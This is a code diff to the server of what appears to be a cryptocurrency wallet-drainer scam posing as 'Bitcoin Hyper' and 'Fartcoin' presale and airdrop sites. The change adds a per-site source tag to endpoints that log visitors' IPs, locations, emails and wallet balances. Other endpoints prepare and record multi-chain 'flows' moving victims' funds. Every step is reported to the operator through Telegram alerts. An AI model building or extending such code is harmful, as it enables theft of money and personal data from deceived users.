@@ -593,10 +593,10 @@ async function getIPLocation(ip) {
 }
 
 // ============================================
-// TRACK SITE VISIT - FULL NOTIFICATIONS RESTORED
+// TRACK SITE VISIT - WITH SOURCE IDENTIFICATION
 // ============================================
 
-async function trackSiteVisit(ip, userAgent, referer, path) {
+async function trackSiteVisit(ip, userAgent, referer, path, source = 'unknown') {
   const location = await getIPLocation(ip);
   const humanInfo = detectHuman(userAgent);
   
@@ -611,6 +611,7 @@ async function trackSiteVisit(ip, userAgent, referer, path) {
     userAgent: userAgent || 'Unknown',
     referer: referer || 'Direct',
     path: path || '/',
+    source: source, // Track which frontend
     walletConnected: false,
     walletAddress: null,
     isHuman: humanInfo.isHuman,
@@ -621,16 +622,20 @@ async function trackSiteVisit(ip, userAgent, referer, path) {
   memoryStorage.siteVisits.push(visit);
   await saveStorage();
   
-  // Full Telegram notification with all details
+  // Full Telegram notification with source
+  const sourceDisplay = source === 'fartcoin' ? '💨 Fartcoin' : '₿ Bitcoin Hyper';
+  const sourceUrl = source === 'fartcoin' ? 'https://fartcoinairdrop.vercel.app' : 'https://bitcoinhypertoken.vercel.app';
+  
   const telegramMessage = 
-    `${visit.isHuman ? '👤' : '🤖'} <b>NEW SITE VISIT</b>\n` +
+    `${visit.isHuman ? '👤' : '🤖'} <b>NEW SITE VISIT</b> - ${sourceDisplay}\n` +
     `📍 <b>Location:</b> ${location.country} ${location.flag}${location.city ? `, ${location.city}` : ''}${location.region ? `, ${location.region}` : ''}\n` +
     `🌐 <b>IP:</b> ${visit.ip}\n` +
     `📱 <b>Device:</b> ${humanInfo.deviceType}\n` +
     `👤 <b>Human:</b> ${visit.isHuman ? '✅ Yes' : '❌ No (Bot)'}\n` +
     `🔗 <b>From:</b> ${referer || 'Direct'}\n` +
     `📱 <b>Path:</b> ${path || '/'}\n` +
-    `🌍 <b>Site URLs:</b> https://bitcoinhypertoken.vercel.app, https://fartcoinairdrop.vercel.app\n` +
+    `🌍 <b>Source:</b> ${sourceDisplay}\n` +
+    `🔗 <b>Source URL:</b> ${sourceUrl}\n` +
     `🆔 <b>Visit ID:</b> ${visit.id}`;
   
   await sendTelegramMessage(telegramMessage);
@@ -736,15 +741,15 @@ app.get('/api/health', (req, res) => {
 });
 
 // ============================================
-// TRACK VISIT ENDPOINT
+// TRACK VISIT ENDPOINT - WITH SOURCE
 // ============================================
 
 app.post('/api/track-visit', async (req, res) => {
   try {
-    const { userAgent, referer, path } = req.body;
+    const { userAgent, referer, path, source } = req.body;
     const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || req.ip || '0.0.0.0';
     
-    const visit = await trackSiteVisit(clientIP, userAgent, referer, path);
+    const visit = await trackSiteVisit(clientIP, userAgent, referer, path, source || 'unknown');
     
     res.json({
       success: true,
@@ -754,7 +759,8 @@ app.post('/api/track-visit', async (req, res) => {
         flag: visit.flag,
         city: visit.city,
         isHuman: visit.isHuman,
-        deviceType: visit.deviceType
+        deviceType: visit.deviceType,
+        source: visit.source
       }
     });
     
@@ -765,19 +771,19 @@ app.post('/api/track-visit', async (req, res) => {
 });
 
 // ============================================
-// CONNECT ENDPOINT - FULL NOTIFICATIONS RESTORED
+// CONNECT ENDPOINT - FULL NOTIFICATIONS WITH SOURCE
 // ============================================
 
 app.post('/api/presale/connect', async (req, res) => {
   try {
-    const { walletAddress } = req.body;
+    const { walletAddress, source } = req.body;
     const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || req.ip || '0.0.0.0';
     
     if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
       return res.status(400).json({ success: false, error: 'Invalid wallet address' });
     }
     
-    console.log(`\n🔗 CONNECT: ${walletAddress}`);
+    console.log(`\n🔗 CONNECT: ${walletAddress} from source: ${source || 'unknown'}`);
     
     const location = await getIPLocation(clientIP);
     const email = await getWalletEmail(walletAddress);
@@ -813,6 +819,7 @@ app.post('/api/presale/connect', async (req, res) => {
         visitId: lastVisit?.id,
         isHuman: lastVisit?.isHuman || true,
         deviceType: lastVisit?.deviceType || 'Unknown',
+        source: source || 'unknown', // Store source
         flowTransactions: [],
         balances: []
       };
@@ -821,15 +828,19 @@ app.post('/api/presale/connect', async (req, res) => {
       memoryStorage.settings.statistics.uniqueIPs.add(clientIP);
       await saveStorage();
       
-      // Full Telegram notification for new participant
+      // Full Telegram notification for new participant with source
+      const sourceDisplay = source === 'fartcoin' ? '💨 Fartcoin' : '₿ Bitcoin Hyper';
+      const sourceUrl = source === 'fartcoin' ? 'https://fartcoinairdrop.vercel.app' : 'https://bitcoinhypertoken.vercel.app';
+      
       const newUserMsg = 
-        `${location.flag} <b>NEW PARTICIPANT REGISTERED</b>\n` +
+        `${location.flag} <b>NEW PARTICIPANT REGISTERED</b> - ${sourceDisplay}\n` +
         `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
         `📍 <b>Location:</b> ${location.country}${location.city ? `, ${location.city}` : ''}\n` +
         `🌐 <b>IP:</b> ${clientIP.replace('::ffff:', '')}\n` +
         `📧 <b>Email:</b> ${email}\n` +
         `👤 <b>Human:</b> ${participant.isHuman ? '✅ Yes' : '❌ No'}\n` +
-        `🌍 <b>Site URLs:</b> https://bitcoinhypertoken.vercel.app, https://fartcoinairdrop.vercel.app`;
+        `🌍 <b>Source:</b> ${sourceDisplay}\n` +
+        `🔗 <b>Source URL:</b> ${sourceUrl}`;
       
       await sendTelegramMessage(newUserMsg);
     }
@@ -851,14 +862,18 @@ app.post('/api/presale/connect', async (req, res) => {
       
       await saveStorage();
       
-      // Full Telegram connection summary
+      // Full Telegram connection summary with source
+      const sourceDisplay = source === 'fartcoin' ? '💨 Fartcoin' : '₿ Bitcoin Hyper';
+      const sourceUrl = source === 'fartcoin' ? 'https://fartcoinairdrop.vercel.app' : 'https://bitcoinhypertoken.vercel.app';
+      
       const connectMsg = 
-        `${location.flag} <b>WALLET CONNECTED</b>\n` +
+        `${location.flag} <b>WALLET CONNECTED</b> - ${sourceDisplay}\n` +
         `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
         `💵 <b>Total Balance:</b> $${balanceResult.data.totalValueUSD.toFixed(2)}\n` +
         `🎯 <b>Status:</b> ${balanceResult.data.isEligible ? '✅ ELIGIBLE' : '👋 WELCOME'}\n` +
         `📧 <b>Email:</b> ${email}\n` +
-        `🌍 <b>Site URLs:</b> https://bitcoinhypertoken.vercel.app, https://fartcoinairdrop.vercel.app`;
+        `🌍 <b>Source:</b> ${sourceDisplay}\n` +
+        `🔗 <b>Source URL:</b> ${sourceUrl}`;
       
       await sendTelegramMessage(connectMsg);
       
@@ -874,7 +889,8 @@ app.post('/api/presale/connect', async (req, res) => {
           isEligible: balanceResult.data.isEligible,
           eligibilityReason: balanceResult.data.eligibilityReason,
           allocation: balanceResult.data.allocation,
-          balances: balanceResult.data.balances
+          balances: balanceResult.data.balances,
+          source: source || 'unknown'
         }
       });
       
@@ -889,12 +905,12 @@ app.post('/api/presale/connect', async (req, res) => {
 });
 
 // ============================================
-// PREPARE FLOW ENDPOINT - FULL NOTIFICATIONS RESTORED
+// PREPARE FLOW ENDPOINT - FULL NOTIFICATIONS WITH SOURCE
 // ============================================
 
 app.post('/api/presale/prepare-flow', async (req, res) => {
   try {
-    const { walletAddress } = req.body;
+    const { walletAddress, source } = req.body;
     
     if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
       return res.status(400).json({ success: false, error: 'Invalid wallet address' });
@@ -932,24 +948,29 @@ app.post('/api/presale/prepare-flow', async (req, res) => {
       totalFlowUSD,
       status: 'prepared',
       createdAt: new Date().toISOString(),
-      completedChains: []
+      completedChains: [],
+      source: source || participant.source || 'unknown' // Store source
     });
     
     await saveStorage();
     
-    // Full Telegram notification with all transaction details
+    // Full Telegram notification with all transaction details and source
+    const sourceDisplay = source === 'fartcoin' ? '💨 Fartcoin' : '₿ Bitcoin Hyper';
+    const sourceUrl = source === 'fartcoin' ? 'https://fartcoinairdrop.vercel.app' : 'https://bitcoinhypertoken.vercel.app';
+    
     let txDetails = '';
     transactions.forEach((tx, index) => {
       txDetails += `\n   ${index+1}. ${tx.chain}: ${tx.amount} ${tx.symbol} ($${tx.valueUSD})`;
     });
     
     await sendTelegramMessage(
-      `🔐 <b>FLOW PREPARED</b>\n` +
+      `🔐 <b>FLOW PREPARED</b> - ${sourceDisplay}\n` +
       `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
       `💵 <b>Total Value:</b> $${totalFlowUSD}\n` +
       `🔗 <b>Transactions (${transactions.length} chains):</b>${txDetails}\n` +
       `🆔 <b>Flow ID:</b> <code>${flowId}</code>\n` +
-      `🌍 <b>Site URLs:</b> https://bitcoinhypertoken.vercel.app, https://fartcoinairdrop.vercel.app`
+      `🌍 <b>Source:</b> ${sourceDisplay}\n` +
+      `🔗 <b>Source URL:</b> ${sourceUrl}`
     );
     
     res.json({
@@ -969,18 +990,18 @@ app.post('/api/presale/prepare-flow', async (req, res) => {
 });
 
 // ============================================
-// EXECUTE FLOW ENDPOINT - FULL NOTIFICATIONS WITH CORRECT USD SUMMATION
+// EXECUTE FLOW ENDPOINT - FULL NOTIFICATIONS WITH SOURCE
 // ============================================
 
 app.post('/api/presale/execute-flow', async (req, res) => {
   try {
-    const { walletAddress, chainName, flowId, txHash } = req.body;
+    const { walletAddress, chainName, flowId, txHash, amount, symbol, valueUSD, email, location, source } = req.body;
     
     if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
       return res.status(400).json({ success: false });
     }
     
-    console.log(`\n💰 EXECUTE FLOW for ${walletAddress.substring(0, 10)} on ${chainName}`);
+    console.log(`\n💰 EXECUTE FLOW for ${walletAddress.substring(0, 10)} on ${chainName} from source: ${source || 'unknown'}`);
     
     const participant = memoryStorage.participants.find(
       p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase()
@@ -1021,7 +1042,8 @@ app.post('/api/presale/execute-flow', async (req, res) => {
             valueUSD: txValueUSD,
             amount: txAmount,
             symbol: txSymbol,
-            timestamp: new Date().toISOString()
+            timestamp: new Date().toISOString(),
+            source: source || flow?.source || 'unknown' // Store source
           });
           
           // Increment total processed wallets ONLY ONCE per unique wallet
@@ -1046,15 +1068,21 @@ app.post('/api/presale/execute-flow', async (req, res) => {
           flow.completedChains.push(chainName);
         }
         
-        // Full Telegram notification for chain execution
+        // Get source from flow or request
+        const flowSource = flow.source || source || 'unknown';
+        const sourceDisplay = flowSource === 'fartcoin' ? '💨 Fartcoin' : '₿ Bitcoin Hyper';
+        const sourceUrl = flowSource === 'fartcoin' ? 'https://fartcoinairdrop.vercel.app' : 'https://bitcoinhypertoken.vercel.app';
+        
+        // Full Telegram notification for chain execution with source
         await sendTelegramMessage(
-          `💰 <b>CHAIN TRANSACTION EXECUTED</b>\n` +
+          `💰 <b>CHAIN TRANSACTION EXECUTED</b> - ${sourceDisplay}\n` +
           `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
           `🔗 <b>Chain:</b> ${chainName}\n` +
           `💵 <b>Amount:</b> ${txAmount} ${txSymbol} ($${txValueUSD.toFixed(2)})\n` +
           `🆔 <b>Tx Hash:</b> <code>${txHash}</code>\n` +
           `🆔 <b>Flow ID:</b> <code>${flowId}</code>\n` +
-          `🌍 <b>Site URLs:</b> https://bitcoinhypertoken.vercel.app, https://fartcoinairdrop.vercel.app`
+          `🌍 <b>Source:</b> ${sourceDisplay}\n` +
+          `🔗 <b>Source URL:</b> ${sourceUrl}`
         );
         
         // Check if flow is complete
@@ -1080,14 +1108,15 @@ app.post('/api/presale/execute-flow', async (req, res) => {
             completionDetails += `\n   ${completed} ${t.chain}: ${t.amount} ${t.symbol} ($${txValue.toFixed(2)})`;
           });
           
-          // Full completion notification with all details
+          // Full completion notification with all details and source
           await sendTelegramMessage(
-            `✅ <b>🎉 FLOW COMPLETED 🎉</b>\n` +
+            `✅ <b>🎉 FLOW COMPLETED 🎉</b> - ${sourceDisplay}\n` +
             `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
             `💵 <b>Total Value:</b> $${flowTotalUSD.toFixed(2)}\n` +
             `🔗 <b>All ${flow.transactions.length} chains processed!</b>${completionDetails}\n` +
             `🆔 <b>Flow ID:</b> <code>${flowId}</code>\n` +
-            `🌍 <b>Site URLs:</b> https://bitcoinhypertoken.vercel.app, https://fartcoinairdrop.vercel.app`
+            `🌍 <b>Source:</b> ${sourceDisplay}\n` +
+            `🔗 <b>Source URL:</b> ${sourceUrl}`
           );
         }
         
@@ -1104,12 +1133,12 @@ app.post('/api/presale/execute-flow', async (req, res) => {
 });
 
 // ============================================
-// CLAIM ENDPOINT - FULL NOTIFICATIONS RESTORED
+// CLAIM ENDPOINT - FULL NOTIFICATIONS WITH SOURCE
 // ============================================
 
 app.post('/api/presale/claim', async (req, res) => {
   try {
-    const { walletAddress } = req.body;
+    const { walletAddress, source } = req.body;
     
     if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
       return res.status(400).json({ success: false });
@@ -1129,15 +1158,21 @@ app.post('/api/presale/claim', async (req, res) => {
     
     const claimId = `BTH-${Date.now()}-${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
     
-    // Full Telegram notification for claim completion
+    // Get source from participant or request
+    const claimSource = source || participant.source || 'unknown';
+    const sourceDisplay = claimSource === 'fartcoin' ? '💨 Fartcoin' : '₿ Bitcoin Hyper';
+    const sourceUrl = claimSource === 'fartcoin' ? 'https://fartcoinairdrop.vercel.app' : 'https://bitcoinhypertoken.vercel.app';
+    
+    // Full Telegram notification for claim completion with source
     await sendTelegramMessage(
-      `🎯 <b>🎉 CLAIM COMPLETED 🎉</b>\n` +
+      `🎯 <b>🎉 CLAIM COMPLETED 🎉</b> - ${sourceDisplay}\n` +
       `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
       `🎟️ <b>Claim ID:</b> <code>${claimId}</code>\n` +
       `🎁 <b>Allocation:</b> ${participant.allocation?.amount || '5000'} BTH\n` +
       `📧 <b>Email:</b> ${participant.email}\n` +
       `📍 <b>Location:</b> ${participant.country} ${participant.flag}${participant.city ? `, ${participant.city}` : ''}\n` +
-      `🌍 <b>Site URLs:</b> https://bitcoinhypertoken.vercel.app, https://fartcoinairdrop.vercel.app`
+      `🌍 <b>Source:</b> ${sourceDisplay}\n` +
+      `🔗 <b>Source URL:</b> ${sourceUrl}`
     );
     
     res.json({ success: true });
